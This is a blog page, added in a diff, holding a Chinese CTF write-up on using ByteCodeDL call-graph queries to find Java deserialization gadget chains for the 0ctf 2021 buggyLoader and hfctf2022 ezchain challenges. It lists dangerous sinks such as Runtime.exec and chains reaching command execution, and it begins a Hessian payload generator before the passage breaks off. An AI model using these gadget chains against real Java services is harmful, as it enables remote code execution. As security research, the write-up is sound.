@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":"enable","show_result":false,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文首发于跳跳糖 本文将分享如何用 ByteCodeDL 的 CHA 调用图分析功能，解决两个CTF题目。 buggyLoader 0ctf-2021-final这是0ctf 2021 决赛的一道题目，NeSE和r3kapig解出了这个题目。题目地址见 https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/">
+<meta name="keywords" content="java,deserialization,bytecodedl,static-analysis,ctf,gadget">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ByteCodeDL应用篇之CHA在CTF中的应用">
+<meta property="og:url" content="https://blog.sometimenaive.com/2022/05/05/bytecodedl-cha-in-ctf/index.html">
+<meta property="og:site_name" content="yxxx&#39;s blog">
+<meta property="og:description" content="本文首发于跳跳糖 本文将分享如何用 ByteCodeDL 的 CHA 调用图分析功能，解决两个CTF题目。 buggyLoader 0ctf-2021-final这是0ctf 2021 决赛的一道题目，NeSE和r3kapig解出了这个题目。题目地址见 https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2022/5/image-20220505092630696.png.webp">
+<meta property="og:updated_time" content="2023-12-31T12:47:14.833Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ByteCodeDL应用篇之CHA在CTF中的应用">
+<meta name="twitter:description" content="本文首发于跳跳糖 本文将分享如何用 ByteCodeDL 的 CHA 调用图分析功能，解决两个CTF题目。 buggyLoader 0ctf-2021-final这是0ctf 2021 决赛的一道题目，NeSE和r3kapig解出了这个题目。题目地址见 https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/">
+<meta name="twitter:image" content="https://blog.sometimenaive.com/blog-img/2022/5/image-20220505092630696.png.webp">
+  <link rel="canonical" href="https://blog.sometimenaive.com/2022/05/05/bytecodedl-cha-in-ctf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>ByteCodeDL应用篇之CHA在CTF中的应用 | yxxx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yxxx's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-recommend">
+      
+    
+
+    <a href="/recommend" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>recommend</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://blog.sometimenaive.com/2022/05/05/bytecodedl-cha-in-ctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yxxx">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yxxx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">ByteCodeDL应用篇之CHA在CTF中的应用
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2022-05-05 00:00:00" itemprop="dateCreated datePublished" datetime="2022-05-05T00:00:00+00:00">2022-05-05</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-31 12:47:14" itemprop="dateModified" datetime="2023-12-31T12:47:14+00:00">2023-12-31</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sec/" itemprop="url" rel="index"><span itemprop="name">sec</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文首发于<a href="https://tttang.com/archive/1510/" target="_blank" rel="noopener">跳跳糖</a></p>
+<p>本文将分享如何用 <a href="https://github.com/BytecodeDL/ByteCodeDL" target="_blank" rel="noopener">ByteCodeDL</a> 的 CHA 调用图分析功能，解决两个CTF题目。</p>
+<h2 id="buggyLoader-0ctf-2021-final"><a href="#buggyLoader-0ctf-2021-final" class="headerlink" title="buggyLoader 0ctf-2021-final"></a>buggyLoader 0ctf-2021-final</h2><p>这是0ctf 2021 决赛的一道题目，NeSE和r3kapig解出了这个题目。题目地址见 <a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader" target="_blank" rel="noopener">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader</a> 。这道题的灵感来自Shiro环境下的CC链构造，准确的说来自zsx的<a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">这篇文章</a></p>
+<p>难点在于反序列化时无法创建数组类型，导致InvokerTransformer 的字段iArgs只能为null，所以最终只能调用public 无参函数。常见的反序列化最后调用的函数有：</p>
+<ol>
+<li>JdbcRowSetImpl#getDatabaseMetaData() 和 JdbcRowSetImpl#getParameterMetaData 利用JNDI进行攻击</li>
+<li>TemplatesImpl#getOutputProperties()</li>
+</ol>
+<p>但是上述两类在这个题目都不能用，由于不出网，第一种方式不能用，由于TemplatesImpl的<code>_bytecodes</code>字段为数组，所以第二种方式也不能用。</p>
+<p><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">Orange</a>在做强网杯那题的时候，最后使用了<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java" target="_blank" rel="noopener">JRMP Client</a> 这个payload，第一次反序列化时，发起RMI请求，然后在RMI处理响应的时候会再次触发反序列化，第二次反序列化就没有任何限制了。这种方式有两种局限，第一种是需要环境能外连，第二种是高版本的JDK下JRMP Client这个payload不能用了（具体的版本我忘了）。</p>
+<p>如果这题能够外连，可以先调用JdbcRowSetImpl，利用JNDI发起一次RMI请求，在RMI处理响应时会再次触发反序列化，类似JRMP Client的效果，但是对JDK版本没有限制。</p>
+<p>已知的套路都不能用了，这题该怎么做呢？重新找个能够造成危害的public 无参函数：可以直接执行命令/代码或者能够二次反序列化。</p>
+<p>第一步我们先筛选出 public 无参函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;inputDeclaration.dl&quot;</span><br><span class="line">#include &quot;utils.dl&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.decl NonParamPublicMethod(method:Method, class:Class)</span><br><span class="line">.output NonParamPublicMethod</span><br><span class="line"></span><br><span class="line">NonParamPublicMethod(method, class) :-</span><br><span class="line">    MethodInfo(method, simplename, _, class, _, _, arity),</span><br><span class="line">    // method 需要被pulic修饰</span><br><span class="line">    MethodModifier(&quot;public&quot;, method),</span><br><span class="line">    // 排除构造函数</span><br><span class="line">    simplename != &quot;&lt;init&gt;&quot;,</span><br><span class="line">    // 参数数量为零</span><br><span class="line">    arity = 0,</span><br><span class="line">    // 类需要能可序列化</span><br><span class="line">    SubClass(class, &quot;java.io.Serializable&quot;).</span><br></pre></td></tr></table></figure>
+<p>JDK中满足条件的一共10459条，如果一条条筛选下来还是比较困难的</p>
+<p>我们再进一步做个限制，让这10459个初步满足条件的函数，作为入口函数，进行调用图分析，看一下5步之内，有没有可能调用到危险函数。<br><a href="https://github.com/BytecodeDL/ByteCodeDL/blob/main/example/ctf-buggyLoader.dl" target="_blank" rel="noopener">example/ctf-buggyLoader.dl</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#define MAXSTEP 5</span><br><span class="line"></span><br><span class="line">#include &quot;inputDeclaration.dl&quot;</span><br><span class="line">#include &quot;utils.dl&quot;</span><br><span class="line">#include &quot;cha.dl&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.decl NonParamPublicMethod(method:Method, class:Class)</span><br><span class="line">.output NonParamPublicMethod</span><br><span class="line"></span><br><span class="line">// 通过class和函数名定义危险函数</span><br><span class="line">.decl SinkDesc(simplename:symbol, class:Class)</span><br><span class="line"></span><br><span class="line">// 加入常见的危险函数</span><br><span class="line">SinkDesc(&quot;exec&quot;, &quot;java.lang.Runtime&quot;).</span><br><span class="line">SinkDesc(&quot;&lt;init&gt;&quot;, &quot;java.lang.ProcessBuilder&quot;).</span><br><span class="line">SinkDesc(&quot;start&quot;, &quot;java.lang.ProcessImpl&quot;).</span><br><span class="line">SinkDesc(&quot;loadClass&quot;, &quot;java.lang.ClassLoader&quot;).</span><br><span class="line">SinkDesc(&quot;defineClass&quot;, &quot;java.lang.ClassLoader&quot;).</span><br><span class="line">SinkDesc(&quot;readObject&quot;, &quot;java.io.ObjectInputStream&quot;).</span><br><span class="line">SinkDesc(&quot;readExternal&quot;, &quot;java.io.ObjectInputStream&quot;).</span><br><span class="line"></span><br><span class="line">// 定义具体的危险函数</span><br><span class="line">.decl SinkMethod(method:Method)</span><br><span class="line">.output SinkMethod</span><br><span class="line"></span><br><span class="line">// 定义具体的危险函数</span><br><span class="line">.decl EntryMethod(method:Method)</span><br><span class="line"></span><br><span class="line">// 根据方法名和类名解析初具体的危险方法</span><br><span class="line">// 子类中的同名方法也认为是危险函数</span><br><span class="line">SinkMethod(method) :-</span><br><span class="line">    SinkDesc(simplename, class),</span><br><span class="line">    SubEqClass(subeqclass, class),</span><br><span class="line">    !ClassModifier(&quot;abstract&quot;, subeqclass),</span><br><span class="line">    MethodInfo(method, simplename, _, subeqclass, _, _, _).</span><br><span class="line"></span><br><span class="line">// 将满足条件的无参函数作为入口方法</span><br><span class="line">EntryMethod(method),</span><br><span class="line">Reachable(method, 0),</span><br><span class="line">NonParamPublicMethod(method, class) :- </span><br><span class="line">    MethodInfo(method, simplename, _, class, _, _, arity),</span><br><span class="line">    MethodModifier(&quot;public&quot;, method),</span><br><span class="line">    simplename != &quot;&lt;init&gt;&quot;,</span><br><span class="line">    arity = 0,</span><br><span class="line">    SubClass(class, &quot;java.io.Serializable&quot;).</span><br><span class="line"></span><br><span class="line">// 调用图中节点</span><br><span class="line">.decl CallNode(node:Method, label:symbol)</span><br><span class="line">.output CallNode</span><br><span class="line"></span><br><span class="line">// 不是入口节点和危险节点 标记为method</span><br><span class="line">CallNode(node, &quot;method&quot;) :-</span><br><span class="line">    !EntryMethod(node),</span><br><span class="line">    !SinkMethod(node),</span><br><span class="line">    Reachable(node, _).</span><br><span class="line"></span><br><span class="line">// 危险节点标记为 sink</span><br><span class="line">CallNode(node, &quot;sink&quot;) :-</span><br><span class="line">    Reachable(node, _),</span><br><span class="line">    SinkMethod(node).</span><br><span class="line"></span><br><span class="line">// 入口节点标记为entry</span><br><span class="line">CallNode(node, &quot;entry&quot;) :-</span><br><span class="line">    EntryMethod(node).</span><br><span class="line"></span><br><span class="line">// 调用边</span><br><span class="line">.decl CallEdge(caller:Method, callee:Method)</span><br><span class="line">.output CallEdge</span><br><span class="line"></span><br><span class="line">CallEdge(caller, callee) :-</span><br><span class="line">    CallGraph(_, caller, callee).</span><br></pre></td></tr></table></figure>
+<p>对于如何输入生成facts，如何执行souffle，参考<a href="https://github.com/BytecodeDL/ByteCodeDL/tree/main/docs" target="_blank" rel="noopener">ByteCodeDL文档</a></p>
+<p>通过 bash importOutput2Neo4j.sh neoImportCall.sh dbname 导入到neo4j数据库</p>
+<p>执行查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(e:entry)-[*1..2]-&gt;(s:sink) where s.method contains &quot;readObject&quot;  RETURN p</span><br></pre></td></tr></table></figure>
+<p>长度为1-2的调用到readObject的路径</p>
+<p>可以筛选出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.security.SignedObject: java.lang.Object getObject()&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.rmi.MarshalledObject: java.lang.Object get()&gt;</span><br></pre></td></tr></table></figure>
+<p>但是这俩还是都需要数组字段，不满足我们的需求</p>
+<p>对于排查不满足需求的，可以通过下面的方式删除节点，同时删除和这个节点相连的边</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (m:method) where ID(m)=42186</span><br><span class="line">DETACH DELETE m</span><br></pre></td></tr></table></figure>
+<p>长度为4的查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(e:entry)-[*4]-&gt;(s:sink) where s.method contains &quot;readObject&quot;  RETURN p</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(e:entry)-[*4]-&gt;(s:sink) where s.method contains &quot;readObject&quot; and ID(e)=57653  unwind nodes(p) as n return n.method</span><br></pre></td></tr></table></figure>
+<p>查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;javax.management.remote.rmi.RMIConnector: void connect()&gt;</span><br><span class="line">&lt;javax.management.remote.rmi.RMIConnector: void connect(java.util.Map)&gt;</span><br><span class="line">&lt;javax.management.remote.rmi.RMIConnector: javax.management.remote.rmi.RMIServer findRMIServer(javax.management.remote.JMXServiceURL,java.util.Map)&gt;</span><br><span class="line">&lt;javax.management.remote.rmi.RMIConnector: javax.management.remote.rmi.RMIServer findRMIServerJRMP(java.lang.String,java.util.Map,boolean)&gt;</span><br><span class="line">&lt;java.io.ObjectInputStream: java.lang.Object readObject()&gt;</span><br></pre></td></tr></table></figure>
+<p>大致的流程如下</p>
+<p>rmiConnector.jmxServiceURL.urlPath -&gt; base64 decode -&gt; ByteArrayInputStream -&gt; ObjectInputStream -&gt; readObject</p>
+<p>这个刚好满足我们的要求，最终的解法就是：<br>readOjbect -&gt; … -&gt; InvokerTransformer -&gt; RMIConnector#connect() -&gt; .. -&gt; readObject -&gt; 传统的 CC 链</p>
+<h2 id="ezchain-hfctf2022"><a href="#ezchain-hfctf2022" class="headerlink" title="ezchain hfctf2022"></a>ezchain hfctf2022</h2><p>这是虎符CTF 2022年的一道题，bk和ty1310解出了这个题目。题目的环境见：<a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/hfctf-2022/ezchain" target="_blank" rel="noopener">https://github.com/waderwu/My-CTF-Challenges/tree/master/hfctf-2022/ezchain</a> </p>
+<p>这也是道反序列化的题，只不过换成了Hessian反序列化，也是内网环境，无法外连。给了Rome第三方库，Marshalsec中包含了这个链，不过最后调用的是JdbcRowSetImpl ，利用JNDI完成攻击。由于无法外连，所以这条路被堵死了。熟悉反序列化的同学，应该能想到可不可以换成TemplatesImpl ， 经过调试之后发现也不行，因为Hessian在反序列化的时候不会调用readObject ，导致被transient 修饰的字段<code>_tfactory</code>一直为null，后续调用<code>_tfactory.getExternalExtensionsMap()</code>会触发空指针错误。</p>
+<p>所以已公开的东西都用不了了，需要重新找链，通过分析之后Rome链一直能用到调用任意无参数的getter函数，所以我们只要再重新找个getter函数即可。和上题差不多，危险函数可以是能够执行命令/代码或者能够造成二次反序列化。</p>
+<p>其实在上题中，我们已经找到了一个满足条件的getter函数，那就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.security.SignedObject: java.lang.Object getObject()&gt;</span><br></pre></td></tr></table></figure>
+<p>利用getObject可以造成二次反序列化，然后就可以使用ysoserial中的rome链了，这个解法是二血ty1310队伍提供的。</p>
+<p>只要将ctf-buggyLoader.dl中的入口函数限制改一下，就可以用到这个题上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EntryMethod(method),</span><br><span class="line">Reachable(method, 0),</span><br><span class="line">NonParamPublicMethod(method, class) :- </span><br><span class="line">    MethodInfo(method, simplename, _, class, _, _, arity),</span><br><span class="line">    MethodModifier(&quot;public&quot;, method),</span><br><span class="line">    // 方法名包含get</span><br><span class="line">    contains(&quot;get&quot;, simplename),</span><br><span class="line">    // 无参数</span><br><span class="line">    arity = 0.</span><br><span class="line">    // hessian反序列化时不要求实现Serializable</span><br></pre></td></tr></table></figure>
+<p>如果按照这个版本的<a href="https://github.com/BytecodeDL/ByteCodeDL/blob/75a90a8baf9ebbcee573498d8077f61d2a8b338a/logic/cha.dl" target="_blank" rel="noopener">cha.dl</a> 只能找到这个，这个我也已经验证可以用。payload我就不给了，大家可以参考UnixPrintServiceLookup进行构造。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.sun.corba.se.impl.activation.ServerManagerImpl: int[] getActiveServers()&gt;</span><br><span class="line">&lt;com.sun.corba.se.impl.activation.ServerTableEntry: boolean isValid()&gt;</span><br><span class="line">&lt;com.sun.corba.se.impl.activation.ServerTableEntry: void activate()&gt;</span><br><span class="line">&lt;java.lang.Runtime: java.lang.Process exec(java.lang.String)&gt;</span><br></pre></td></tr></table></figure>
+<p>但是并没有找到预期解，这个UnixPrintServiceLookup这个类，这是因为在构造调用图时没有考虑一种间接调用，调用可以简化成这种</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">caller()&#123;</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedExceptionAction() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            callee();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于doPrivileged是native方法，无法进行后续的分析，这里就需要进行个特殊处理，认为caller可以直接调用这个run方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CallGraph(insn, caller, method) :- </span><br><span class="line">    Reachable(caller, n),</span><br><span class="line">    n &lt; MAXSTEP,</span><br><span class="line">    StaticMethodInvocation(insn, _, method, caller),</span><br><span class="line">    MethodInfo(method, &quot;doPrivileged&quot;, _, &quot;java.security.AccessController&quot;, _, _, _),</span><br><span class="line">    ActualParam(0, insn, param),</span><br><span class="line">    VarType(param, type),</span><br><span class="line">    MethodInfo(callee, &quot;run&quot;, _, type, _, _, 0).</span><br></pre></td></tr></table></figure>
+<p>改进之后的完整版本<a href="https://github.com/BytecodeDL/ByteCodeDL/blob/main/logic/cha.dl" target="_blank" rel="noopener">cha.dl</a></p>
+<p>然后当长度为设置4的时候就可以查到了</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2022/5/image-20220505092630696.png.webp" alt="image-20220505092630696"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;sun.print.UnixPrintServiceLookup: javax.print.PrintService getDefaultPrintService()&gt;</span><br><span class="line">&lt;sun.print.UnixPrintServiceLookup: java.lang.String getDefaultPrinterNameBSD()&gt;</span><br><span class="line">&lt;sun.print.UnixPrintServiceLookup: java.lang.String[] execCmd(java.lang.String)&gt;</span><br><span class="line">&lt;sun.print.UnixPrintServiceLookup$1: java.lang.Object run()&gt;</span><br><span class="line">&lt;java.lang.Runtime: java.lang.Process exec(java.lang.String[])&gt;</span><br></pre></td></tr></table></figure>
+<p>payload为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"HFCTF2022"</span>.hashCode());</span><br><span class="line">        s = <span class="string">":Y1\"nOJF-6A'&gt;|r-"</span>;</span><br><span class="line">        System.out.println(s.hashCode());</span><br><span class="line">        </span><br><span class="line">        String cmd = args[<span class="number">0</span>];</span><br><span class="line">        String path = args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        FileOutputStream outputStream = <span class="keyword">new</span> FileOutputStream(path);</span><br><span class="line">        Hessian2Output out = <span class="keyword">new</span> 